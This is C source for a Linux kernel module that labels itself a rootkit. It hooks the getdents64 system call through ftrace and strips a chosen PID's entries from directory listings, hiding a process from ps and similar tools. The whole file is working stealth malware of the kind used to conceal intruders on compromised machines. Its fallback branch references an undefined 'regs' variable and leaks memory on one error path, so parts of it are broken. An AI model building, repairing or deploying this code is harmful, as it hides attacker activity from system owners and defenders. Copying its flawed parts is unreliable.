#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Hooks getdent64 and hides processes.");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static int hide_pid = -1;
module_param(hide_pid, int, 0);

struct linux_dirent64 {
    u64        d_ino;
    s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char       d_name[];
};

/* Function prototypes */
asmlinkage int hook_getdents64(const struct pt_regs *regs);

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si;
    char *kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirp, ret)) {
        kfree(kbuf);
        return ret;
    }

    long bpos = 0;
    while (bpos < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + bpos);
        if (hide_pid != -1 && simple_strtoul(d->d_name, NULL, 10) == hide_pid) {
            memmove(d, (char *)d + d->d_reclen, ret - bpos - d->d_reclen);
            ret -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirp, kbuf, ret))
    	return -EFAULT;
    kfree(kbuf);
    return ret;
}
#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    long ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    char *kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirp, ret)) {
        kfree(kbuf);
        return ret;
    }

    long bpos = 0;
    while (bpos < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + bpos);
        if (hide_pid != -1 && simple_strtoul(d->d_name, NULL, 10) == hide_pid) {
            memmove(d, (char *)d + d->d_reclen, ret - bpos - d->d_reclen);
            ret -= d->d_reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirp, kbuf, ret))
    	return -EFAULT;
    kfree(kbuf);
    return ret;
}
#endif

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
